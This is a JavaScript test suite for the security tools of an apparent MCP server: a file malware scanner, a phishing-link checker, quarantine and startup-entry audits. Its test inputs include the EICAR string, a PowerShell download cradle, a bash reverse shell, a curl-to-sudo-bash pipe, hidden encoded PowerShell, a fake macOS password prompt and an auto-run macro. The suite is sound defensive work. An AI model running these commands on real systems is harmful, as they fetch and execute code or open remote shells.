import assert from "node:assert/strict";
import { chmod, mkdir, mkdtemp, readFile, realpath, rm, stat, writeFile } from "node:fs/promises";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";
import { after, before, test } from "node:test";
import { denialFor, readPolicy, toolGroup } from "../src/policy.js";
import { REMOTE_TOOLS } from "../src/remote-tools.js";
import { assessEntry, checkPersistence } from "../src/security/persistence.js";
import { deleteQuarantined, listQuarantine, quarantineFile, restoreFile } from "../src/security/quarantine.js";
import { reaAnalyze, reaCommandsFor } from "../src/security/rea.js";
import { entropy, fileKind, nameFindings, scanBuffer, scanPath, scanTree } from "../src/security/scanner.js";
import { checkUrl, extractUrls, registrableDomain } from "../src/security/url.js";
import { checkUrlsTool, scanFileTool } from "../src/tools/security.js";

let dir;
before(async () => {
  dir = await realpath(await mkdtemp(join(tmpdir(), "smcp-security-")));
});
after(() => rm(dir, { recursive: true, force: true }));

// Built from parts so this test file is not itself flagged by other antivirus products.
const EICAR = ["X5O!P%@AP[4\\PZX54(P^)7CC)7}", "$EICAR-STANDARD-ANTIVIRUS-", "TEST-FILE!$H+H*"].join("");
const payload = (result) => JSON.parse(result.content[0].text);
const noHashes = new Map();

// Engine

test("reconoce el archivo de prueba EICAR por hash y por contenido", () => {
  const result = scanBuffer(Buffer.from(EICAR), { name: "eicar.com" });
  assert.equal(result.verdict, "malicious");
  assert.equal(result.sha256, "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f");
  assert.ok(result.findings.some((finding) => finding.id === "hash.known_threat"));
  const byContent = scanBuffer(Buffer.from(`${EICAR}\n`), { name: "x.txt", hashes: noHashes });
  assert.ok(byContent.findings.some((finding) => finding.id === "eicar.test"));
  assert.equal(byContent.verdict, "malicious");
});

test("un texto normal sale limpio", () => {
  const result = scanBuffer(Buffer.from("Lista del súper: leche, huevo, pan.\n"), { name: "lista.txt" });
  assert.equal(result.verdict, "clean");
  assert.equal(result.findings.length, 0);
});

test("identifica el tipo real por los bytes, no por el nombre", () => {
  assert.equal(fileKind(Buffer.from("MZ\x90\x00", "latin1"), "factura.pdf"), "pe");
  assert.equal(fileKind(Buffer.from([0x7f, 0x45, 0x4c, 0x46]), "x"), "elf");
  assert.equal(fileKind(Buffer.from([0xcf, 0xfa, 0xed, 0xfe]), "x"), "macho");
  assert.equal(fileKind(Buffer.from("%PDF-1.7"), "x"), "pdf");
  assert.equal(fileKind(Buffer.from("#!/bin/sh\necho"), "x"), "script");
  assert.equal(fileKind(Buffer.from("<!doctype html><p>"), "x"), "html");
});

test("un programa disfrazado de PDF o con doble extensión es sospechoso", () => {
  const disguised = scanBuffer(Buffer.concat([Buffer.from("MZ", "latin1"), Buffer.alloc(64)]), { name: "factura.pdf", hashes: noHashes });
  assert.ok(disguised.findings.some((finding) => finding.id === "type.disguised_program"));
  assert.notEqual(disguised.verdict, "clean");
  const double = nameFindings("estado_de_cuenta.pdf.exe", "pe");
  assert.ok(double.some((finding) => finding.id === "name.double_extension"));
  const rtlo = nameFindings("foto\u202egpj.exe", "pe");
  assert.ok(rtlo.some((finding) => finding.id === "name.rtlo"));
});

test("detecta inyección de procesos en un ejecutable de Windows", () => {
  const imports = "KERNEL32.dll\0VirtualAllocEx\0WriteProcessMemory\0CreateRemoteThread\0";
  const pe = Buffer.concat([Buffer.from("MZ", "latin1"), Buffer.alloc(200), Buffer.from(imports, "latin1")]);
  const result = scanBuffer(pe, { name: "tool.exe", hashes: noHashes });
  assert.ok(result.findings.some((finding) => finding.id === "pe.process_injection"));
  assert.equal(result.verdict, "suspicious");
});

test("las importaciones de inyección solas no cuentan en un texto", () => {
  const result = scanBuffer(Buffer.from("VirtualAllocEx WriteProcessMemory CreateRemoteThread explained"), { name: "notas.md", hashes: noHashes });
  assert.ok(!result.findings.some((finding) => finding.id === "pe.process_injection"));
});

test("detecta scripts que descargan y ejecutan, shells inversas y PowerShell oculto", () => {
  const cradle = scanBuffer(Buffer.from("IEX (New-Object Net.WebClient).DownloadString('http://x.example/a')"), { name: "a.ps1", hashes: noHashes });
  assert.ok(cradle.findings.some((finding) => finding.id === "script.powershell_cradle"));
  const shell = scanBuffer(Buffer.from("#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"), { name: "s.sh", hashes: noHashes });
  assert.ok(shell.findings.some((finding) => finding.id === "script.reverse_shell"));
  assert.notEqual(shell.verdict, "clean");
  const pipe = scanBuffer(Buffer.from("curl -fsSL https://x.example/i.sh | sudo bash\n"), { name: "install.txt", hashes: noHashes });
  assert.ok(pipe.findings.some((finding) => finding.id === "script.download_and_execute"));
  const encoded = scanBuffer(Buffer.from("powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"), { name: "r.bat", hashes: noHashes });
  assert.ok(encoded.findings.some((finding) => finding.id === "script.powershell_encoded"));
});

test("detecta la ventana falsa de contraseña de macOS", () => {
  const text = `osascript -e 'display dialog "macOS needs your password" default answer "" with hidden answer'`;
  const result = scanBuffer(Buffer.from(text), { name: "update.command", hashes: noHashes });
  assert.ok(result.findings.some((finding) => finding.id === "script.mac_fake_password_prompt"));
});

test("detecta macros que se ejecutan al abrir un documento", () => {
  const ole = Buffer.concat([Buffer.from([0xd0, 0xcf, 0x11, 0xe0]), Buffer.from("....VBA....Sub AutoOpen()\nShell(\"cmd\")", "latin1")]);
  const result = scanBuffer(ole, { name: "pedido.doc", hashes: noHashes });
  assert.ok(result.findings.some((finding) => finding.id === "office.auto_macro"));
  assert.ok(result.findings.some((finding) => finding.id === "office.macro_shell"));
  assert.equal(result.verdict, "malicious");
});

test("la entropía distingue datos aleatorios de texto", () => {
  assert.equal(entropy(Buffer.alloc(1000)), 0);
  const random = Buffer.alloc(65536);
  for (let i = 0; i < random.length; i += 1) random[i] = (i * 2654435761) >>> 24;
  assert.ok(entropy(Buffer.from("aaaabbbb")) <= 1);
  assert.ok(entropy(random) > 7);
});

test("respeta las firmas que agrega la persona", async () => {
  const file = join(dir, "sigs.json");
  const content = "contenido marcado por la persona";
  const { createHash } = await import("node:crypto");
  const hash = createHash("sha256").update(content).digest("hex");
  await writeFile(file, JSON.stringify({ hashes: { [hash]: "Muestra local" } }));
  const { loadHashes } = await import("../src/security/signatures.js");
  const result = scanBuffer(Buffer.from(content), { name: "x.txt", hashes: loadHashes(file) });
  assert.equal(result.verdict, "malicious");
  assert.match(result.findings[0].title, /Muestra local/);
  assert.equal(loadHashes(join(dir, "no-existe.json")).size >= 1, true);
});

// Files and folders

test("escanea archivos y carpetas, y solo lista lo marcado", async () => {
  const root = join(dir, "descargas");
  await mkdir(join(root, "sub"), { recursive: true });
  await writeFile(join(root, "bien.txt"), "hola");
  await writeFile(join(root, "sub", "eicar.com"), EICAR);
  await writeFile(join(root, "sub", "s.sh"), "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
  const single = await scanPath(join(root, "sub", "eicar.com"));
  assert.equal(single.verdict, "malicious");
  const report = await scanTree(root);
  assert.equal(report.scanned, 3);
  assert.equal(report.malicious, 1);
  assert.equal(report.flagged.length, 2);
  assert.equal(report.flagged[0].verdict, "malicious");
  assert.equal(report.complete, true);
});

test("el escaneo de carpetas no entra en rutas privadas", async () => {
  const root = join(dir, "privado");
  await mkdir(join(root, "secreto"), { recursive: true });
  await writeFile(join(root, "secreto", "eicar.com"), EICAR);
  const report = await scanTree(root, { isBlocked: (path) => path.endsWith("secreto") });
  assert.equal(report.scanned, 0);
  assert.equal(report.skippedPrivate, 1);
});

test("security_scan_file rechaza credenciales y marca el resultado como externo", async () => {
  const blocked = await scanFileTool({ path: join(homedir(), ".ssh", "id_rsa") }).catch((error) => error);
  assert.match(blocked.message, /blocked/);
  const file = join(dir, "e.com");
  await writeFile(file, EICAR);
  const result = payload(await scanFileTool({ path: file }));
  assert.equal(result._untrusted_external, true);
  assert.equal(result.data.verdict, "malicious");
  assert.match(result.data.advice, /quarantine/);
});

// Links

test("los enlaces legítimos se ven seguros", () => {
  for (const link of ["https://www.paypal.com/signin", "https://accounts.google.com/", "https://www.bbva.mx/personas.html", "https://www.sat.gob.mx/", "https://www.pineapple.com/"]) {
    assert.equal(checkUrl(link).verdict, "looks_safe", link);
  }
});

test("detecta suplantación de marcas, typos, punycode y destinos ocultos", () => {
  assert.equal(checkUrl("https://paypal-secure-login.xyz/verify").verdict, "dangerous");
  assert.ok(checkUrl("https://paypa1.com/").findings.some((finding) => finding.id === "url.brand_impersonation" || finding.id === "url.typosquat"));
  assert.ok(checkUrl("https://arnazon.com/").findings.some((finding) => ["url.typosquat", "url.brand_impersonation"].includes(finding.id)));
  assert.ok(checkUrl("https://xn--pple-43d.com/").findings.some((finding) => finding.id === "url.punycode"));
  assert.ok(checkUrl("https://www.bbva.mx@evil.example/").findings.some((finding) => finding.id === "url.userinfo"));
  assert.ok(checkUrl("http://192.168.0.10/login").findings.some((finding) => finding.id === "url.ip_host"));
  assert.equal(checkUrl("javascript:alert(1)").verdict, "dangerous");
  assert.ok(checkUrl("https://example.com/factura.exe").findings.some((finding) => finding.id === "url.downloads_program"));
});

test("dominio registrable con sufijos de dos niveles", () => {
  assert.equal(registrableDomain("www.bbva.com.mx"), "bbva.com.mx");
  assert.equal(registrableDomain("a.b.example.com"), "example.com");
});

test("saca los enlaces de un texto y los revisa todos", () => {
  const text = "Hola, revisa https://www.paypal.com/ y también http://bbva-mx-verificar.top/login. Gracias";
  assert.deepEqual(extractUrls(text), ["https://www.paypal.com/", "http://bbva-mx-verificar.top/login"]);
  const result = payload(checkUrlsTool({ text }));
  assert.equal(result.checked, 2);
  assert.equal(result.results[0].verdict, "dangerous");
  assert.throws(() => checkUrlsTool({}), /at least one link/);
});

// Quarantine

test("cuarentena: mueve, bloquea, lista, restaura y borra", async () => {
  const box = join(dir, "q");
  const file = join(dir, "malo.exe");
  await writeFile(file, EICAR);
  await chmod(file, 0o755);
  const record = await quarantineFile(file, { reason: "prueba", scan: scanBuffer(Buffer.from(EICAR)), dir: box });
  await assert.rejects(stat(file), /ENOENT/);
  assert.equal(record.verdict, "malicious");
  const stored = join(box, record.id, "file.quarantined");
  assert.equal((await stat(stored)).mode & 0o777, 0o400);
  assert.equal((await listQuarantine({ dir: box })).length, 1);

  await writeFile(file, "otro");
  await assert.rejects(restoreFile(record.id, { dir: box }), /Another file/);
  await rm(file);
  await restoreFile(record.id, { dir: box });
  assert.equal(await readFile(file, "utf8"), EICAR);
  assert.equal((await stat(file)).mode & 0o777, 0o755);
  assert.equal((await listQuarantine({ dir: box })).length, 0);

  const again = await quarantineFile(file, { dir: box });
  await deleteQuarantined(again.id, { dir: box });
  assert.equal((await listQuarantine({ dir: box })).length, 0);
  await assert.rejects(restoreFile("../../etc", { dir: box }), /not valid/);
});

// Start-up items

test("marca entradas de arranque que ejecutan desde /tmp o descargan algo", async () => {
  const clean = await assessEntry({ label: "com.example.helper", program: "/usr/bin/true", command: "/usr/bin/true" }, { scan: async () => ({ verdict: "clean" }) });
  assert.equal(clean.flagged, false);
  const tmp = await assessEntry({ label: "com.x.a8f3k2j9d0q1z7", program: "/tmp/.x/agent", command: "/tmp/.x/agent" });
  assert.equal(tmp.flagged, true);
  assert.ok(tmp.reasons.length >= 2);
  const shell = await assessEntry({ label: "upd", program: "/bin/sh", command: "/bin/sh -c curl -s https://x.example | sh" }, { scan: async () => ({ verdict: "clean" }) });
  assert.equal(shell.flagged, true);
});

test("lee el registro de Windows sin tocar nada", async () => {
  const exec = async (file, args) => {
    if (file === "reg" && args[1].startsWith("HKCU") && args[1].endsWith("Run")) {
      return { code: 0, stdout: 'HKEY_CURRENT_USER\\...\\Run\r\n    Updater    REG_SZ    "C:\\Users\\Public\\upd.exe" -silent\r\n' };
    }
    return { code: 1, stdout: "" };
  };
  const report = await checkPersistence({ exec, os: "win32", scan: async () => ({ verdict: "clean" }) });
  const entry = report.entries.find((item) => item.label === "Updater");
  assert.equal(entry.program, "C:\\Users\\Public\\upd.exe");
  assert.equal(entry.flagged, true);
});

// REA

test("REA es opcional y solo se usa si está instalado", async () => {
  const missing = await reaAnalyze("/x", "pe", { bin: null });
  assert.equal(missing.available, false);
  assert.match(missing.hint, /rea-agents/);
  assert.deepEqual(reaCommandsFor("macho"), ["inspect-binary-hardening"]);
  const calls = [];
  const exec = async (file, args) => {
    calls.push([file, ...args]);
    return { code: 0, stdout: JSON.stringify({ ok: args[0] }) };
  };
  const report = await reaAnalyze("/apps/a.exe", "pe", { bin: "/usr/local/bin/rea", exec });
  assert.equal(report.available, true);
  assert.deepEqual(calls[0], ["/usr/local/bin/rea", "inspect-binary-hardening", "/apps/a.exe", "--json"]);
  assert.equal(Object.keys(report.reports).length, 4);
});

// Permissions

test("el antivirus tiene su permiso, empieza encendido y la cuarentena respeta solo lectura", () => {
  assert.equal(toolGroup("security_scan_file"), "security");
  const policy = readPolicy(join(dir, "no-existe.json"));
  assert.equal(policy.disabled.security, false);
  assert.equal(denialFor("security_scan_file", { readOnlyHint: true }, policy), null);
  const readOnly = { ...policy, readOnly: true };
  assert.match(denialFor("security_quarantine", { readOnlyHint: false, destructiveHint: true }, readOnly), /read-only/);
  const off = { ...policy, disabled: { ...policy.disabled, security: true } };
  assert.match(denialFor("security_scan_file", { readOnlyHint: true }, off), /security/);
});

test("desde fuera se puede escanear, pero no mover archivos", () => {
  assert.ok(REMOTE_TOOLS.has("security_scan_file"));
  assert.ok(REMOTE_TOOLS.has("security_check_url"));
  assert.ok(!REMOTE_TOOLS.has("security_quarantine"));
  assert.ok(!REMOTE_TOOLS.has("security_restore"));
  assert.ok(!REMOTE_TOOLS.has("security_delete_quarantined"));
});
